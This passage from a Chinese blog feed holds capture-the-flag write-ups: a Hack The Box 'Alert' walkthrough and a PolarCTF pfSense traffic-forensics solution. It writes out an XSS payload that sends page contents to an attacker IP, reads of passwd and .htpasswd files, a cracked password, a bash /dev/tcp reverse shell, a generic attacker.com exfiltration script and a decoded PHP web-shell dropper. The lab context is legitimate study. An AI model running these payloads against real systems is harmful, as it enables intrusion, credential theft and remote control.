class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Alert - Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=alert&quot;</span>&gt;</span>Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=contact&quot;</span>&gt;</span>Contact Us<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=about&quot;</span>&gt;</span>About Us<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=donate&quot;</span>&gt;</span>Donate<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-container&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;visualizer.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">&quot;.md&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;View Markdown&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: black;&quot;</span>&gt;</span>?2024 Alert. All rights reserved.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后试试 <code>message.php</code> 页面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://alert.htb/messages.php&quot;</span>)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.10.16.15:1234/?file_content=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(data));&#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/253675b58065147a.png"></p><p>进行 URL 解码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.<span class="hljs-property">php</span>%3Ffile%3D2024-<span class="hljs-number">03</span>-<span class="hljs-number">10_15</span>-<span class="hljs-number">48</span>-<span class="hljs-number">34.</span>txt%<span class="hljs-number">27</span>%<span class="hljs-number">3E2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">10_15</span>-<span class="hljs-number">48</span>-<span class="hljs-number">34.</span>txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A<br>:<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Messages<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;messages.php?file=2024-03-10_15-48-34.txt&#x27;</span>&gt;</span>2024-03-10_15-48-34.txt<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>接受了一个 <code>file</code> 参数，那么像前面一样去读取一下 <code>/etc/passwd</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/d0c5fa159375f6d1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;pre&gt;root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>albert:x:1000:1000:albert:/home/albert:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>david:x:1001:1002:,,,:/home/david:/bin/bash<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>读取 <code>/etc/hosts</code> 文件，得到了子域</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> localhost<br><span class="hljs-number">127.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> alert<br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> alert.<span class="hljs-property">htb</span><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span><br><br># <span class="hljs-title class_">The</span> following lines are desirable <span class="hljs-keyword">for</span> <span class="hljs-title class_">IPv6</span> capable hosts<br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br><span class="hljs-attr">fe00</span>::<span class="hljs-number">0</span> ip6-localnet<br><span class="hljs-attr">ff00</span>::<span class="hljs-number">0</span> ip6-mcastprefix<br><span class="hljs-attr">ff02</span>::<span class="hljs-number">1</span> ip6-allnodes<br><span class="hljs-attr">ff02</span>::<span class="hljs-number">2</span> ip6-allrouters<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>访问 <code>statistics.alert.htb</code> 发现需要密码登录</p><p><img src="https://img.dkdun.cn/v1/2025/12/69f8231413bdb109.png"></p><p>网站是 Apache 服务器，读取它的配置文件 <code>/etc/apache2/sites-available/000-default.conf</code></p><p><a href="https://daolgts.github.io/2019/03/08/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%90%9C%E9%9B%86/">敏感文件搜集</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/f73ee8d2d16630ec.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="hljs-title class_">RewriteEngine</span> <span class="hljs-title class_">On</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^alert\.<span class="hljs-property">htb$</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^$<br>    <span class="hljs-title class_">RewriteRule</span> ^<span class="hljs-regexp">/?(.*)$ http:/</span><span class="hljs-regexp">/alert.htb/</span>$1 [R=<span class="hljs-number">301</span>,L]<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br>        <span class="hljs-title class_">Options</span> <span class="hljs-title class_">Indexes</span> <span class="hljs-title class_">FollowSymLinks</span> <span class="hljs-title class_">MultiViews</span><br>        <span class="hljs-title class_">AllowOverride</span> <span class="hljs-title class_">All</span><br>        <span class="hljs-title class_">AuthType</span> <span class="hljs-title class_">Basic</span><br>        <span class="hljs-title class_">AuthName</span> <span class="hljs-string">&quot;Restricted Area&quot;</span><br>        <span class="hljs-title class_">AuthUserFile</span> /<span class="hljs-keyword">var</span>/www/statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span>/.<span class="hljs-property">htpasswd</span><br>        <span class="hljs-title class_">Require</span> valid-user<br>    &lt;/<span class="hljs-title class_">Directory</span>&gt;<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br>&lt;/pre&gt;<br><br></code></pre></td></tr></table></figure><p>根据配置文件信息去读取 <code>/var/www/statistics.alert.htb/.htpasswd</code> 文件</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">&lt;pre&gt;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>URL 解码后还有一层加密，john 破解</p><p><img src="https://img.dkdun.cn/v1/2025/12/3a7eea225b64bd2f.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">albert:</span>manchesterunited<br></code></pre></td></tr></table></figure><p>尝试直接登录</p><p><img src="https://img.dkdun.cn/v1/2025/12/8ca88f89e7a9c453.png"></p><p>啥有用的都没有，ssh 登录，拿到 user flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">59e3b7beba7b4b3802988ebd8f91fb26<br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>发现还存在另一个用户 <code>david</code>，但是没用权限访问，没啥用</p><p><img src="https://img.dkdun.cn/v1/2025/12/97f3bf1648cbf020.png"></p><p>发现开放了 8080 端口</p><p><img src="https://img.dkdun.cn/v1/2025/12/ad79cd5bd4150414.png"></p><p>也没用，查看进程发现 <code>/opt</code> 下的 <code>website-monitor</code> 有 root 权限运行</p><p><img src="https://img.dkdun.cn/v1/2025/12/d8f23e385ec58629.png"></p><p>在 <code>/opt/website-monitor/config</code> 写入一个 shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;/dev/tcp/10.10.16.15/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问 <code>http://127.0.0.1:8080/config/shell.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/e5acbc7d64eee663.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/f354fb3d5fb5a7c6.png"></p><p>拿到 root flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span><span class="hljs-number">586</span>ada<span class="hljs-number">87358</span>a<span class="hljs-number">165</span>d<span class="hljs-number">65</span>bfc<span class="hljs-number">94</span>a<span class="hljs-number">6</span>bc<span class="hljs-number">4459</span><br></code></pre></td></tr></table></figure><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/xss/#steal-contents-of-restricted-pages-or-files">https://exploit-notes.hdks.org/exploit/web/security-risk/xss/#steal-contents-of-restricted-pages-or-files</a></p><p>如果 JavaScript 代码可以通过 XSS 执行，我们就可以让受害者获取受限页面的内容并将其发送到我们的服务器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/secret&quot;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://attacker.com/?text=<span class="hljs-subst">$&#123;btoa(text)&#125;</span>`</span>);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://attacker.com/?err=<span class="hljs-subst">$&#123;err&#125;</span>`</span>);<br>        &#125;);<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PolarCTF2025春季个人挑战赛-Misc</title>
    <link href="/2025/03/23/PolarCTF%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Misc/"/>
    <url>/2025/03/23/PolarCTF%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Misc/</url>
    
    <content type="html"><![CDATA[<p>两个简单的取证</p><span id="more"></span><h1 id="pfsense"><a href="#pfsense" class="headerlink" title="pfsense"></a>pfsense</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span>、从流量数据包中找出攻击者利用漏洞开展攻击的会话，写出其中攻击者执行的命令中设置的<span class="hljs-built_in">flag</span>内容<br><span class="hljs-number">2</span>、攻击者通过漏洞利用获取设备控制权限，然后查找设备上的<span class="hljs-built_in">flag</span>文件，写出<span class="hljs-built_in">flag</span>的文件内容<br><span class="hljs-number">3</span>、找出并提交受控机设备中普通用户的IPsec预共享密钥<br></code></pre></td></tr></table></figure><h2 id="pfsense1"><a href="#pfsense1" class="headerlink" title="pfsense1"></a>pfsense1</h2><p>Wireshark 过滤 http 流量，找到了攻击会话</p><p><img src="https://img.dkdun.cn/v1/2025/12/30cc3def4e54dc7d.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">8</span>kYT<span class="hljs-number">1</span>mb<span class="hljs-number">3</span>BlbigiL<span class="hljs-number">3</span>Vzci<span class="hljs-number">9</span>sb<span class="hljs-number">2</span><span class="hljs-symbol">NhbC93</span>d<span class="hljs-number">3</span>c<span class="hljs-attr">vc3</span>lzdGVtX<span class="hljs-number">2</span>FkdmFuY<span class="hljs-number">2</span>VkX<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRyb2</span>wucGhwIiwidyIpI<span class="hljs-name">G9</span>yIGRpZSgpOyR<span class="hljs-number">0</span>PSc<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocCBwcmludChwYX<span class="hljs-symbol">NzdGhydSggJF9</span>HRVRbImMiXSkpOz<span class="hljs-number">8</span>+Jztmd<span class="hljs-number">3</span>JpdGUoJGEsJHQp<span class="hljs-meta">O2</span>Zjb<span class="hljs-name">G9</span>zZSggJGEpOz<span class="hljs-number">8</span>+ZmxhZ<span class="hljs-number">3</span>tjOTMwYTIw<span class="hljs-symbol">NzI5</span>Y<span class="hljs-number">2</span>Q<span class="hljs-number">3</span>MTBjOWFjMmUxYm<span class="hljs-symbol">NkMzY4</span><span class="hljs-symbol">NTZlNX0</span>=<br></code></pre></td></tr></table></figure><p>base64 解码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/usr/local/www/system_advanced_control.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;&lt;?php print(passthru( $_GET[&quot;c&quot;]));?&gt;&#x27;</span>;<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$t</span>);<span class="hljs-title function_ invoke__">fclose</span>( <span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span>flag&#123;c930a20729cd710c9ac2e1bcd36856e5&#125;<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-keyword">c</span><span class="hljs-number">930</span>a<span class="hljs-number">20729</span>cd<span class="hljs-number">710</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ac<span class="hljs-number">2e1</span>bcd<span class="hljs-number">36856e5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="pfsense2"><a href="#pfsense2" class="headerlink" title="pfsense2"></a>pfsense2</h2><p>可以看到攻击者执行了 <code>ls -al</code> 命令</p><p><img src="https://img.dkdun.cn/v1/2025/12/5db2396b294b7fd7.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.139.2.139/system_advanced_control.php?c=ls -al<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ddc0a613b7a0b1a2.png"></p><p>按照会话显示上传木马</p><p><img src="https://img.dkdun.cn/v1/2025/12/5be58b647ab46f99.png"></p><p>执行会得到结果，用 find 命令查找 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;fla*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/42ec91e9abda60e2.png"></p><p>找到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>b030dacb6e82a5cca0b1e6d2c8779fa&#125;<br></code></pre></td></tr></table></figure><h2 id="pfsense3"><a href="#pfsense3" class="headerlink" title="pfsense3"></a>pfsense3</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>搜了一下 pfSense 的默认密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure><p>不行，然后找到了重置密码方法，“运行<code>/etc/rc.initial.password</code>以重置为默认密码”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;y&quot;</span> | /etc/rc.initial.password<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/43d8a64a9c4093fa.png"></p><p>登录进去后找到 VPN 中的 IPSec</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f1a1977a7ea2dd36.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;bde<span class="hljs-number">4</span>b<span class="hljs-number">5e2</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">43</span><span class="hljs-keyword">c</span><span class="hljs-number">177895</span>f<span class="hljs-number">6</span>f<span class="hljs-number">5</span>d<span class="hljs-number">85</span>beb<span 